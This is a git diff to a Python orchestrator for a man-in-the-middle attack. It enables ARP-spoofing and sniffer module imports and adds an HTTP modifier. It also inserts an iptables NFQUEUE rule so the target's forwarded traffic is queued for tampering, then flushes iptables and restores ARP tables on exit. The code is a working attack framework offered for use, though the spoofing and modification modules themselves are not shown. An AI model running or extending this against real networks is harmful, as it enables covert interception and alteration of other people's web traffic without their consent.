@@ -1,34 +1,12 @@
 import threading
 import time
-#from ..modules import arp_spoofer
+from ..modules import arp_spoofer
 import scapy.all as scapy
-#from ..modules import sniffer
+from ..modules import sniffer
+from ..manipulation import http_modifier
+from ..utils import get_mac
+import subprocess
 
-def get_mac(ip_address):
-    """
-    This function takes in an IP address and crafts an ARP request packet asking for it's MAC address.
-    By wrapping the request in an ethernet broadcasting frame, this request will be seen by all devices on the network
-    It will parse the response and return the MAC address
-    """
-
-    arp_request = scapy.ARP(pdst=ip_address)
-
-    arp_request_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-
-    # Combine ARP request and ethernet frame into a single packet
-    arp_request_broadcast = arp_request_broadcast/arp_request
-    
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-
-    # If answered_list contains pairs of (sent, recieved) packet
-    if answered_list:
-
-        # Find MAC adress of first recieved packet
-        return answered_list[0][1].hwsrc
-    else:
-        return None
-
-print(get_mac("10.0.0.83"))
 
 def _arp_spoof_loop(target_ip, gateway_ip, target_mac, gateway_mac):
     """
@@ -50,8 +28,17 @@ def start_mitm_attack(target_ip, gateway_ip, interface):
     Main orchestrator for the full MitM attack.
     """
     print("[CORE] Initializing Man-in-the-Middle attack...")
-    
+
+    # Initialize variables to None to ensure they exist for the 'finally' block
+    target_mac = None
+    gateway_mac = None
+
     try:
+
+        # Set up iptables to queue packets
+        print("[CORE] Setting up iptables rules...")
+        subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"], check=True)
+    
         # Look up MAC addresses once at the beginning
         print("[CORE] Resolving MAC addresses...")
         target_mac = get_mac(target_ip)
@@ -77,14 +64,21 @@ def start_mitm_attack(target_ip, gateway_ip, interface):
         spoof_thread.start()
 
         # Start the sniffer in the main thread to capture traffic
-        print("[CORE] Starting packet sniffer. Press Ctrl+C to stop.")
-        filter_string = f"ip host {target_ip}"
-        sniffer.start_sniffing(interface, filter_str=filter_string)
+        print("[CORE] Starting HTTP modifier. Press Ctrl+C to stop.")
+        http_modifier.start()
+        
 
     except KeyboardInterrupt:
         # This message is shown when the user presses Ctrl+C
         print("\n[CORE] Ctrl+C detected. Restoring network and shutting down.")
     finally:
+
+        print ("[CORE] Cleaning up...")
+
+        # Flush iptables rules to restore internet connectivity.
+        print("[CORE] Flushing iptables rules...")
+        subprocess.run(["iptables", "--flush"])
+        
         # This block is guarenteed to run on exit
         print("[CORE] Restoring ARP tables...")
         # Make sure 'target_mac' and 'gateway_mac' were resolved before trying to restore
@@ -92,3 +86,5 @@ def start_mitm_attack(target_ip, gateway_ip, interface):
              arp_spoofer.restore_network(target_ip, gateway_ip, target_mac, gateway_mac)
              arp_spoofer.restore_network(gateway_ip, target_ip, gateway_mac, target_mac)
         print("[CORE] Network restored. Exiting.")
+
+        
